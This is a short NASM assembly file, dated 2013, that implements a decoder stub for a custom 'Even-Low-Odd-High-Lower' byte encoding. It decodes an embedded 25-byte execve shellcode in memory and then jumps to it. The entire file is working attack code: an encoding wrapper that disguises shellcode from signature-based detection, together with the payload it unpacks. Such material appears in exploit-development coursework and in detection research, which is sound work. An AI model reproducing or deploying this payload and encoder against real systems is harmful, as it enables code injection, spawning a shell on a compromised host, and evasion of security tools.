; Title:   elohL-decoder.nasm
; Author:  Ryan Fenno
; Date:    November 25, 2013
; Purpose: Decoder stub w/ execve shellcode for the "Even-Low-Odd-High-Lower"
;          (elohL) encoding scheme. The decoding algorithm is thus:
;          if byte b is greater than or equal to 128: (((b+1)-128)*2)+1
;          if byte b is less than 128:                (b+1)*2
global _start
section .text
_start:
    jmp short shellcode

decoder:
    pop esi
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov bl, 0x80   ; 0x80 (128) is our over/under
    mov cl, 0x19   ; encoded shellcode is 0x19 (25) bytes long
    mov dl, 0x02   ; used for performing multiplication by 2
    lea edi, [esi + ecx - 1]

decode:
    mov al, byte [esi + ecx - 1]
    inc al         ; add one before performing the reverse eloh mapping
    cmp al, bl
    jb low
    ; byte is greater than or equal to 0x80 (128)
    sub al, bl     ; subtract 0x80 (128) from al
    mul dl         ; multiply al by 2
    add al, 0x1    ; add 1 to al
    jmp loopEnd
low:
    ; byte is less than 0x80 (128)
    mul dl         ; multiply al by 2

loopEnd:
    mov byte [edi], al
    dec edi
    loop decode
    
    ; execute the decoded shellcode
    jmp short ELOHL_shellcode

shellcode:
    call decoder
    ELOHL_shellcode: db 0x97,0x5f,0x27,0x33,0x96,0x96,0xb8,0x33,0x33,0x96,0x30,0xb3,0x36,0xc3,0xf0,0x27,0xc3,0x70,0xa8,0xc3,0xef,0x57,0x84,0xe5,0x3f



